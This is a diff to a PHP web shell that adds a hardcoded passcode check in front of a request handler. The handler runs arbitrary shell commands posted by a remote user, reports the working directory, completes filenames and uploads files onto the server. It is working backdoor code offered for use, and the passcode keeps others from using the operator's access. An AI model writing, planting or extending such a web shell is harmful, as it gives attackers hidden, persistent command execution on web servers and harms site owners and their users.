@@ -75,33 +75,34 @@ function featureUpload($path, $file, $cwd) {
     }
 }
 
-if (isset($_GET["feature"])) {
+if ($_GET['passcode'] == 'get_fucked') {
+    if (isset($_GET["feature"])) {
 
-    $response = NULL;
+        $response = NULL;
 
-    switch ($_GET["feature"]) {
-        case "shell":
-            $cmd = $_POST['cmd'];
-            if (!preg_match('/2>/', $cmd)) {
-                $cmd .= ' 2>&1';
-            }
-            $response = featureShell($cmd, $_POST["cwd"]);
-            break;
-        case "pwd":
-            $response = featurePwd();
-            break;
-        case "hint":
-            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
-            break;
-        case 'upload':
-            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
+        switch ($_GET["feature"]) {
+            case "shell":
+                $cmd = $_POST['cmd'];
+                if (!preg_match('/2>/', $cmd)) {
+                    $cmd .= ' 2>&1';
+                }
+                $response = featureShell($cmd, $_POST["cwd"]);
+                break;
+            case "pwd":
+                $response = featurePwd();
+                break;
+            case "hint":
+                $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
+                break;
+            case 'upload':
+                $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
+        }
+
+        header("Content-Type: application/json");
+        echo json_encode($response);
+        die();
     }
-
-    header("Content-Type: application/json");
-    echo json_encode($response);
-    die();
 }
-
 ?><!DOCTYPE html>
 
 <html>
